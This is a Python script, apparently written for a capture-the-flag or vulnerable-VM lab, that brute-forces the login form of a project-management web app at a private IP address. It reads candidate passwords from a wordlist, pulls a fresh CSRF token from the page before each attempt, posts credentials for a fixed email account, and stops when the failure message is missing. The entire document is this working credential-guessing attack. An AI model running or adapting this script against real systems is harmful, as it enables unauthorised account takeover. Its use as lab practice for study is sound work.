#!/usr/bin/python3

from pwn import *
import requests
import re
import sys
import signal

def def_handler(sig, frame):
    print("Exiting")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global Variables
login_url = "http://192.168.0.151/project_management/index.php/login"

def makeForce():
   
    f = open("dic.txt", "r")
    
    p1 = log.progress("Brute Force")
    p1.status("Starting Attack")

    time.sleep(2)
    
    counter = 1

    for password in f.readlines():
        password = password.strip()
        #print(password)
        p1.status("Using password[%d]: %s" % (counter, password))

        s = requests.session()

        r = s.get(login_url)
        
        token = re.findall(r'_csrf_token]" value="(.*?)"', r.text)[0]
        
        data_post = {
            'login[_csrf_token]': token,
            'login[email]': 'ch33s3m4n@cheeseyjack.local',
            'login[password]': password,
            'http_referer': 'http://192.168.0.151/project_management/'
        }
        #print(data_post)

        r = s.post(login_url, data=data_post)

        if "No match" not in r.text:
            p1.success("Password is %s" % password)
            sys.exit(0)
            
        counter += 1
if __name__ == '__main__':
    makeForce()
